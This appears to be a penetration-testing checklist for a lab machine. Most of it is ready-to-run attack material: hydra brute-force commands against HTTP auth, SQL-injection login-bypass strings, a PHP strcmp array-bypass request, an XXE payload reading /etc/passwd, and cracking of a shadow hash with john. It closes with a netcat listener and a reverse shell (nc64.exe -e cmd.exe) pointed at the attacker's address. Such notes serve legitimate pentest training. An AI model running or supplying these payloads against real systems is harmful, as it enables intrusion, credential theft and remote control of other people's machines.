  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 80 -f 192.168.223.43 http-get /
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 80 -f 192.168.223.43 http-get /
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

#### SQL

- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

#### PHP

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

#### XML

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

## UDP
### netbios-ns - 137

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
|               |         |               |

## Privilege Escalation

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.223.43  |
| Local IP          | 192.168.49.223   |
| Local listen port | 80 |

```bash
nc -lvp 80
```

### Windows Privilege Escalation

- [ ] [nc64.exe](https://eternallybored.org/misc/netcat/)

Remote machine

```bash
nc64.exe -e cmd.exe 192.168.49.223 80
```

## When you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

